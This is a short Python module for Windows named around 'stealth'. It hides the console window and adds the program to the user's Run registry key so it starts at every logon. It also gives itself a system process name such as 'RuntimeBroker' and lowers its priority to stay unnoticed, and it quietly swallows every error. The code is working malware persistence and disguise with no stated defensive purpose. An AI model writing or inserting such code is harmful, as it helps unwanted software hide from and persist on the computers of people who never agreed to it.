import os, sys, subprocess, winreg, ctypes

APP_NAME = "RuntimeBroker"
FAKE_NAMES = ["svchost", "RuntimeBroker", "SearchIndexer", "WmiPrvSE"]

def hide_console():
    try:
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)
    except Exception:
        pass

def add_to_autorun():
    try:
        exe = sys.executable if getattr(sys, "frozen", False) else os.path.abspath(sys.argv[0])
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, APP_NAME, 0, winreg.REG_SZ, f'"{exe}"')
        winreg.CloseKey(key)
    except Exception:
        pass

def set_fake_name():
    try:
        import ctypes
        fake = FAKE_NAMES[1]
        ctypes.windll.kernel32.SetConsoleTitleW(fake)
    except Exception:
        pass

def move_to_background():
    try:
        import psutil
        p = psutil.Process(os.getpid())
        p.nice(psutil.IDLE_PRIORITY_CLASS)
    except Exception:
        pass

def init_stealth():
    if sys.platform != "win32":
        return
    hide_console()
    add_to_autorun()
    set_fake_name()
    move_to_background()
